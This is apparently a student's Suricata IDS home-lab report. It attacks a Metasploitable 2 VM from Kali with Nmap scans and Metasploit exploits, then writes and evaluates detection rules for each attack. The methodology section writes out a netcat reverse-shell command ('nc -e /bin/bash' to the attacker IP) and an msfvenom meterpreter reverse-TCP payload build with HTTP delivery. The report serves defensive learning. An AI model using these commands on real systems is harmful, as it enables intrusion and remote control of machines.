# Suricata Lab

## Overview

An intrusion detection system (IDS) is a security control implemented to accurately identify and alert security teams of unauthorised access, malicious activities or policy violations on a network or system. Suricata is an open-source IDS that can detect threats by comparing network traffic against its database of known attack signatures. In this project, I set up a virtualized home lab inspired by and under the guidance of [this repo](https://github.com/0xrajneesh/Suricata-IDS-Home-Lab) to deploy and test Suricata IDS against simulated cyber attacks. By configuring Suricata on an Ubuntu virtual machine (VM), a victim VM (Metasploitable 2), a Kali Linux VM equipped with penetration testing tools (Tcpdump, Nmap and Metasploit Framework), this lab provided a controlled environment to develop and refine Suricata detection rules.

## Network Diagram

<p align="center">
  <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/suricata-lab-diagram.png?raw=true" width="60%"/>
</p>

## Environment Setup

### System Specification

The lab was set up using 2 physical computers. The first hosted the defended network of 2 VMs and the other hosted 1 VM for attack simulation. The defended network VMs ran on a Windows 11 machine using 16GB RAM and 500GB storage. The attacker VM ran on Ubuntu 22.04 machine using 8GB RAM and 500GB storage. VMs were hosted using Oracle VirtualBox on both physical machines.

The following VM provisions were made for the defended network on VirtualBox:
<br>

| Machine Function | RAM (GB) | Processors | Storage (GB) |
|---------- |----------|----------|----------|
| Suricata Ubuntu Server 22.04 | 4 | 3 | 30 |
| Metasploitable 2 | 4 | 3 | 8 |

Unlike the previous 2 VMs which were setup using disk images, the attacker VM was setup using a .vbox file acquired from [the Kali website](http://www.kali.org). As such, a 80GB preset storage was provisioned along with 4GB RAM and 4 CPU cores. The choice of a .vbox setup was so that Kali could be used out the box. In addition, the Suricata server, under Settings > Network > Advanced > Promiscuous Mode was set to Allow All to support the use of a network analyser for rule creation.

### Attacker Machine - Kali Linux

Once the system was booted, the user logged in and an internet connection was established, a package update and upgrade was performed:<br>
```sudo apt-get update && sudo apt-get upgrade -y ```<br>

In addition, the system was checked for the required tools (Nmap and Metasploit Framework) which came pre-installed.

### Suricata IDS - Ubuntu Server 22.04

After resource provisioning in VirtualBox and the initial boot, a package update and upgrade was performed. Suricata was then installed using:<br>
```sudo apt-get install suricata -y```<br>

Upon completion, the installation was confirmed using:<br>
```apt list | grep suricata```<br>

It was then verified that the Suricata service was up and running using:<br>
```sudo systemctl status suricata```<br>

The Suricata /etc/suricata/suricata.yaml file was then configured as follows:
- Defined the HOME_NET variable based all devices on this defended network.
- Set EXTERNAL_NET to "!$HOME_NET".
- Specified the rule location as /etc/suricata/rules/custom.rules (and later created the file).
- Set the packet capture interface to that of my local machine.
- Saved and closed the configuration file.
- To test that Suricata could monitor network traffic, the following rule was added to the custom.rules file to detect simple pings:<br>
```alert icmp any any -> $HOME_NET any (msg:"Ping Test detected"; sid: 1000000; rev:1;)```
- After saving the rule file, Suricata was restarted using:<br>
```sudo systemctl restart suricata```
- To ensure that the configuration worked, the Suricata log file was checked using:<br>
```cat /var/log/suricata.suricata.log```
- Successful configuration was verified from:
  - MTU being found for the specified network interface
  - All default log files being initialised
  - The rule being processed with the 1 rule in it being successfully loaded
  - All AFP capture threads running.
- To test the rule, a ping test was initiated from the attacker machine to this machine's IP address. I then searched for the alert message for the rule in /var/log/suricata/eve.json on the Suricata server.

Next, jq (a JSON processor used for seamless reading of the eve.json log file) was installed using:<br>
```sudo apt-get install jq -y```<br>

Once complete, the download was confirmed using:<br>
```jq --version```<br>

Finally, tcpdump was installed using:<br>
```sudo apt-get install tcpdump -y```<br>

The download was then confirmed using:<br>
```apt list | grep tcpdump```<br>

Tcpdump would later be used to derive rules from conversations between the attacker and victim.

### Metasploitable 2

The system was configured, booted and logged into. Given that Metasploitable 2 is a legacy system, packages were not updated/upgraded. An Nmap scan was then executed from the attacker machine to confirm that the services on the system were visible.

## Methodology - Attacking and Detecting:

This section describes the steps taken to solve each challenge listed in [this repo](https://github.com/0xrajneesh/Suricata-IDS-Home-Lab). To monitor the communication between the attacker and the victim for each attack, tcpdump was initiated on the Suricata server and the network traffic was written to a pcap file as follows:<br>
```sudo tcpdump -i <interface> -vvv -nn -w <exercise name>.pcap "host 192.168.134"```<br>
Thereafter, an attack was launched and once completed, the packet analysis was stopped and the contents examined for patterns that could address each challenge. The findings from the examination of each attack are detailed in the Evaluation and Improvements section.

### Stealth Scan

A stealth scan using Nmap, such as a SYN scan, sends SYN packets to a target without completing the TCP handshake, making it harder to detect in logs compared to a full connection scan. This attack can be used to silently probe for open ports and vulnerabilities, potentially leading to targeted exploits or network intrusions.

Challenge: _Create a Suricata rule to detect TCP SYN packets sent to multiple ports within a short time frame, indicative of Nmap stealth scans._

On the attacker, the nmap scan command below was used and result of the scan was:<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/service-version-scan.png?raw=true">

The rule crafted from the packets captured was:<br>
```
alert tcp any any -> $HOME_NET any (msg: "Possible Nmap stealth scan detected"; flag: S; window: 1024; threshold: typ both, track_by_src, count 5, seconds 10, sid: 1000001; rev:1;)
```
This rule alerts on TCP packets, with the SYN flag set, for any port in $HOME_NET. It specifically triggers when a single source sends 5 or more SYN packets within 10 seconds.<br>

### OS Fingerprinting Scan

An OS fingerprinting scan using Nmap analyzes subtle differences in network responses (such as TCP/IP stack behavior) to determine the target system's operating system and version. Attackers can use this information to tailor exploits specifically for the detected OS, increasing the chances of a successful attack.

Challenge: _Develop a Suricata rule to detect ICMP echo requests and responses with specific TTL values, characteristic of Nmap OS fingerprinting activities._

On the attacker, the nmap scan command below was used and result of the scan was:<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/os-fingerprint-scan.png?raw=true">

The rules crafted from the packets captured were:<br>
```
alert icmp any any -> $HOME_NET any (msg: "ECHO ICMP request detected"; ttl:>39; ttl:<60; sid: 1000002; rev:1;)
alert icmp $HOME_NET any -> any any (msg: "ECHO ICMP response detected"; ttl: 64; sid: 1000003; rev:1;)
```
The first rule alerts on ICMP Echo Request packets sent to $HOME_NET with a TTL between 39 and 59 which may help detect operating system specific fingerprinting attempts or unusual ping behavior. The second rule alerts on responses sent with TTL values of 64 (characteristic of Linux-based operating systems).<br>

### Service Version Scan

A service version scan using Nmap probes open ports to identify running services and their versions by analyzing responses to crafted queries. Attackers can use the gathered information to exploit known vulnerabilities in outdated or misconfigured services, leading to potential system compromise.

Challenge: _Formulate a Suricata rule to detect Nmap service version detection probes based on unique HTTP GET requests or TCP SYN/ACK packets._

On the attacker, the nmap scan command below was used and result of the scan was:<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/stealth-scan.png?raw=true">

The rule crafted from the packets captured was:<br>
```
alert tcp any any -> $HOME_NET any (msg: "Nmap service version scan detected"; flow:established, to_server; content: "nmap"; http_header; sid: 1000004; rev:1;)
```
This rule looks for the string "nmap" in the HTTP headers of TCP traffic going to $HOME_NET when the connection is established and directed to a server.<br>

### Metasploit Exploit Payload - Unreal IRC 3281 (add user payload)

The Metasploit Unreal IRCd 3.2.8.1 Backdoor Exploit targets a backdoor in UnrealIRCd 3.2.8.1, allowing remote attackers to execute arbitrary system commands by sending specially crafted data to the IRC server. In a real-world scenario, this vulnerability can lead to full remote control of the server, enabling attackers to steal data, deploy malware, or use the compromised server as a launchpad for further attacks. In this simulated attack, a new user is added to the target system - a common tactic for maintaining persistent access after exploitation.

Challenge: _Craft a Suricata rule to detect Metasploit exploit payload traffic based on unique signatures or payloads commonly used in exploits._

Metasploit Framework was launched using ```msfconsole``` from the terminal on the attacker. Using the service versions obtained earlier, an exploit for the Unreal IRC module was found and run using the following sequence of commands:<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-search.png?raw=true">
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-settings.png?raw=true">

The following was run on the victim to confirm the newly added user:<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-user-added.png?raw=true"><br>

The rule crafted from the packets captured was:<br>
```
alert tcp any any -> $HOME_NET 6667 (msg: "Metasploit Unreal IRC 3821 add user payload detected"; content: "echo"; pcre: "/echo.*\/etc\/(passwd|sudoers)/"; sid: 1000005; rev:1;)
```
This rule detects attempts to add a user by executing an echo command to modify /etc/passwd or /etc/sudoers. It looks for the keyword "echo" and uses a PCRE pattern to match commands writing to these files on TCP port 6667 (IRC).

### Metasploit Reverse Shell - Leveraging the VSFTPD 2.3.4 vulnerability

A Metasploit reverse shell enables an attacker to execute commands on a compromised system by having the target initiate an outbound connection to the attacker's machine, effectively bypassing firewalls and NAT restrictions. A vulnerability like vsftpd 2.3.4 can be exploited by triggering a backdoor, which spawns an interactive shell with elevated privileges. This can then be used to create a more stable shell initiated from the victim. This reverse connection grants the attacker full control over the system, with little risk of detection, as outbound connections are typically trusted by firewalls and other security defenses.

Challenge: _Develop a Suricata rule to detect Metasploit reverse shell connections by monitoring for outbound TCP connections to known attacker IP addresses._

Metasploit Framework was launched using ```msfconsole``` on the attacker. Using the service versions obtained earlier, an exploit for the VSFTPD 2.3.4 module was found, set up and run using the following sequence of commands:<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-search.png?raw=true)">
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-settings.png?raw=true">

Note that once the vulnerability was exploited and a bind shell was spawned, the attacker ran ```whoami``` and ```uname -a``` to confirm access to the victim (since no prompt was displayed). To set up a reverse shell, the following command was executed using a separate terminal session on the attacker:<br>
```nc -lvnp 17000 ```<br>

This command listened for connections on port 17000 (randomly selected user port). Thereafter, in the spawned shell, the following was executed to connect another shell session to the attacker:<br>
```nc -e /bin/bash 192.168.8.134 17000```<br>

Below is the command used to listen for this reverse shell connection, the output showing successful connection and some commands to setup better utility of the reverse shell:

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/attacker-reverse-shell.png?raw=true">

The rule crafted from the packets captured was:<br>
```
alert tcp $HOME_NET any -> any 17000 (msg:"Possible reverse shell on port 17000"; flow: established, to_server; sid: 1000006; rev: 1;)
```
This rule alerts when an internal host, such as the Metasploitable victim, establishes an outbound TCP connection to port 17000 on any external system. It specifically looks for an established connection where traffic is flowing to the server, which may indicate a reverse shell or other suspicious activity.

### Metasploit Meterpreter Communication - Upgrading the VSFTPD 2.3.4 shell

Meterpreter is a powerful, dynamic payload within Metasploit that provides an interactive shell and supports concise commands. This can streamline attacks and enhance ease of use by allowing attackers to efficiently perform complex tasks like system exploration, privilege escalation, and persistence. The vsftpd 2.3.4 exploit can be exploited to open a bind shell, which the attacker can then upgrade to a Meterpreter shell for more robust control, including stealthy operations and evasion of detection. The risks of such an attack include data theft, further compromise, and long-term control of the targeted system.

Challenge: _Create a Suricata rule to detect Meterpreter communication activities by analyzing HTTP or TCP traffic with characteristic Meterpreter payloads._

Metasploit Framework was launched using ```msfconsole``` on the attacker and the VSFTPD vulnerability was setup and executed as before (see the images in the previous subsection). The Meterpreter payload was then generated using msfvenom in a separate terminal:<br>
```msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.8.134 LPORT=87 -f elf > meter.elf```<br>

The attacker then hosted the payload on a Python web server in another terminal:<br>
```python3 -m http.server 8080```<br>

The attacker then downloaded the payload on the victim machine via the bind shell, set the executable permissions, navigated to the payload's folder and then checked the permisions on the file. Finally, the bind shell session was put into the background:<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/meterpreter-download-setup.png">

From there, a Meterpreter listener was then set up using the following sequence:

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/listener-setup-and-connect.png">

Note that the payload, LHOST and LPORT values were specifically set to match those used to create the meterpreter payload. The exploit was executed as a job to run it in the background. The attacker then switched to the bind shell session. The Meterpreter payload was then executed in the background. Once Metasploit notified that a Meterpreter session was created, the attacker switched to the Meterpreter session (confirmed by the corresponding prompt). The system information from ```sysinfo``` and the IP address from ```ifconfig``` were used to confirm the system under control:

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/meterpreter-system-confirmation.png">

Since the victim was made to download an ELF payload, the Suricata rule was crafted with this in mind:
```
alert tcp any any -> $HOME_NET any (msg:"ELF file transfer detected"; flow:to_client, established; content:"|7F 45 4C 46|"; offset:0; depth:4; sid:1000008; rev:1;)
```

This rule flags outbound payload transfers where the payload's header starts with the ELF magic number (0x7F454C46), indicating an ELF file transfer.

## Evaluation and Improvements:

This section describes the findings from examining the pcap files obtained from each attack. The files are named according to the theme of each challenge. Key properties of each attack are analysed and translated into a rule which is then evaluated for real world efficacy. Where the behaviour of an attack could not be determined from the pcap file, an internet search was performed to learn more about the attack vector and was used to support the evaluation.  

### Stealth Scan

Common patterns within the nmap-stealth.pcap file (see image below) used to craft the rule include:
- The SYN flag was set in packets sent from attacker and no packets with ACK flag were returned following SYN/ACK packets from the victim.
- A large number of packets was sent from the attacker in a short timeframe
- The window size was fixed at 1024

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/stealth-pcap.png?raw=true">

The selected properties were chosen to capture as many fundamental characteristics of stealth scans as possible. The fixed window size, singular source IP address, and default probe frequency setting (T3) were all default parameters of the scan. The rule was designed to account for these defaults while also adapting to variations in probe frequency, ranging from T1 (on the lower end) to as high as T5. Such evasive techniques manipulate packet transmission frequency to evade detection.

While flexible in addressing probe frequency, the rule does not address more sophisticated evasion techniques that alter window sizes, use carefully crafted delays or even scan a smaller port range. Nevertheless, given that the challenge was to write 1 rule, it successfully served its purpose and could be used to detect basic scans such as those performed by script kiddies. To improve its efficacy against more sophisticated scans, more rules should be developed to address evasion techniques targeting various other aspects of the packets captured. 

### OS Fingerprinting

From the nmap-os-fingerprint.pcap file (see image below), the following properties were deemed essential to solve the challenge:
- ICMP Echo Request packets sent with a TTL value between 39 and 59
- ICMP Echo Reply packets consistently returning with a TTL of 64, suggesting that the responses originate from a system with a default TTL value of 64.

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/os-fingerprint-pcap.png">

Nmap’s OS detection relies on measuring how different operating systems respond to crafted probe packets. The first rule accounts for this by flagging ICMP Echo Requests within a specific TTL range, which aligns with Nmap’s method of analyzing TTL variations to infer OS characteristics. Additionally, the second rule detects ICMP Echo Replies with a TTL of 64, a common default setting for various Debian-based operating systems such as the Metasploitable machine.

However, while the rules effectively identify basic ICMP-based fingerprinting attempts, the first rule does not account for more advanced techniques, such as crafted packets with widely variable TTL values or fragmented probes. In the latter case, if Suricata does not perform packet reassembly before applying rules, the TTL field may not be available causing the rule to miss the detection. Another issues concerns the challenge specifying the ICMP protocol. Consequently, both rules do not account for mixed-protocol fingerprinting, evident from the use of TCP in the pcap file. It is also believed that the challenge is not realistic as legitimate uses of ICMP within a network could trigger many false positives. An example would be an error reporting due to an unreachable destination. An improvement to the first rule would be to factor in the packet rate for more granular detection as well as a business policy with a broader view of a system. Nonetheless, given the challenge constraint, these effectively highlight basic OS fingerprinting attempts and provide a foundation for further refinement.

### Service Scan

The following key points were noted from the nmap-service-version.pcap:
- This scan took a longer time to execute than the other 2.
- This pcap file was over double the size of the previous 2.
- There were a mix payloads sent to the victim that were tailored to specific services.
- Different payloads could be sent to a specific service.
- Some 404 responses to HTTP requests were sent from the victim.

Consider the 2 packets below:

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/basic-get-port-80.png">
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/telnet-probe.png">
The first packet is a GET request sent to port 80 (an HTTP port). The second is a prompt on port 23 (a telnet port). Tailored probes like this sent for all known services in Nmap's database would explain the increased processing time and size of this file since more payloads were sent instead of the usual empty payload packets. These and the last point will be important when suggesting improvements to the rule developed. Instances of different payloads being sent to a specific service was the most critical information in crafting this rule. This discovery made it clear that variations of packets could be sent when probing a service. Below are other requests on port 80 with a request target and user agent containing the identifying marker "nmap":<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/nmap-header-get.png">
<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/nmap-header-post.png">

This confirms that Nmap sometimes includes self-identifying markers in its probes and was deemed an adequate search string . On the other hand, while this rule is effective in detecting a specific subset of Nmap service version probes that explicitly contain "nmap" in headers, it may miss:
- Non-HTTP service probes (e.g., Telnet, SSH, SMTP, etc.).
- Cases where Nmap does not use identifying markers in the header (Nmap can be configured to avoid using "nmap" in requests).
- Encrypted services (e.g., HTTPS), where headers are not visible for inspection.

Hence, to improve detection, additional rules should be created to match patterns of multiple service probes within a short time frame, or inspect known service response variations triggered by Nmap’s probes. Supporting network devices would be needed to address encrypted packet inspection, such as a TLS terminating proxy (e.g., NGINX, HAProxy, or Squid) in front of the traffic. This would provide a more robust approach to detecting Nmap service version scans beyond simple string matching in HTTP headers.

### Metasploit Exploit Payload - Unreal IRC 3281 (add user payload)

This attack's hardcoded backdoor trigger "AB;" followed by an arbitrary system command, was instrumental in the crafting of this rule. It was identified in 2 packet payloads sent from the attacker on port 6667, the most important being:<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-packets.png">

The corresponding rule is triggered when a packet contains the keyword "echo" to write a new user (metasploit, as seen in the Methodology section) into the /etc/passwd file or modify privileged access settings in the /etc/sudoers file. Additionally, a PCRE (Perl-Compatible Regular Expression) pattern is used to match attempts to access the aforementioned critical system files, further refining detection. By specifically targeting the combination of "echo" and these sensitive file paths, the rule effectively identifies the command injection technique used in the exploit.

While this rule provides strong detection capabilities for this particular payload, it could be improved by including rules that address other Unreal IRC 3.2.8.1 payloads. As seen in the Methodology section, the remaining payloads are various exploits that spawn shells, hence findings from the shell exploit rules developed here and their unique signatures could be of use.

### Metasploit Reverse Shell - Leveraging the VSFTPD 2.3.4 vulnerability

Unlike the previous exploit, the bind shell (the default payload in this exploit) is not a reverse shell. As such, a reverse shell connection must be initiated by the victim to the attacker. Developing this rule was justified through referring to the system's known services in use. [This source](https://www.youtube.com/watch?v=HAGrnDZhUto) mentions the port's occasional use by HikVision devices for streaming but such device are also not part of this network, hence it was deemed appropriate to craft a rule directly monitoring this port. The rule successfully detected the connection attempt and satisfied the challenge, however several limitations exist. 

Detecting a reverse shell solely by monitoring port 17000 is easily bypassed, as attackers can easily change ports or use common ones like 443 or 80 to blend in with legitimate traffic. Reverse shells can be initiated using various tools, each with different communication patterns, making signature-based detection unreliable and prone to false negatives if the attack method varies. Instead of relying on fixed port monitoring, a better approach is to track uncommon outbound connections, such as a workstation establishing an interactive session with an unknown external IP. Additionally, detecting protocol anomalies, like an HTTP connection behaving like an interactive shell, can help identify suspicious behavior. Given the adaptability of reverse shells, a defense-in-depth strategy—including behavioral analysis, heuristic detection, and active SOC monitoring—provides a more robust and adaptive defense against these threats.

### Metasploit Meterpreter Communication - Upgrading the VSFTPD 2.3.4 shell

The ELF file header signature (0x7F454C46) in TCP traffic from the server to the client was critical in identifying this malicious file transfer. Below is a snippet of the packet:<br>

<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/ELF-file-transfer.png">

This rule successfully flags the transfer of this malicious ELF file, as the specific signature is unique to ELF files and is unlikely to occur in legitimate traffic unless the system is running software that specifically uses ELF files. However, there are several limitations. First, this rule looks for an exact match to the ELF header signature, making it vulnerable to evasion tactics such as payload obfuscation, where the attacker could encode or modify the payload to hide the ELF header. For example, an attacker might encode the ELF file in base64 or fragment packets to avoid detection by the rule. Additionally, the rule only inspects the first few bytes of the packet, which means attackers could manipulate the packet’s initial bytes to bypass detection, especially if the attack involves multi-stage payload delivery (this rule assumed that not to be the case). Finally, this rule may produce false positives if legitimate ELF files (e.g., software updates or legitimate application transfers) are transferred, especially in environments where Linux systems frequently use ELF files for legitimate purposes. To improve the rule, one could include further context, such as analyzing the behavior of the connection or the specific context in which the ELF file is being transferred, making it more adaptable and reducing false positives.

## Conclusion:

The exercises covered in this report demonstrate the effectiveness of detecting various attack techniques using Suricata IDS. The findings highlight the importance of defining rules that account for both basic and advanced threats, given the widespread use of hacking tools like Metasploit by script kiddies, as well as more sophisticated attacks by experienced hackers. By capturing network traffic during different attack scenarios and analyzing packet signatures, custom Suricata rules were successfully developed to identify stealth scans, OS fingerprinting attempts, service version probes, and various exploitation activities.

The crafted rules effectively detected different attack patterns by analyzing unique characteristics such as repeated SYN packets, specific TTL values in ICMP traffic, and Metasploit payload signatures. These detections emphasize the crucial role of rule-based intrusion detection systems in proactively monitoring and securing network environments.

Despite the success in detecting these attacks, further improvements can be made. Reducing false positives and improving detection accuracy can be achieved by fine-tuning threshold values and incorporating context-aware rule conditions. Additionally, integrating anomaly-detection machine learning models alongside rule-based detection could enhance Suricata’s ability to identify novel attack patterns.

In conclusion, Suricata IDS provides a strong foundation for network intrusion detection. The results of this report underscore the need for continuous refinement of detection rules and adaptive security strategies to counter evolving cyber threats effectively. Future work could focus on integrating automated rule generation and dynamic threat intelligence updates to further strengthen network defense mechanisms.

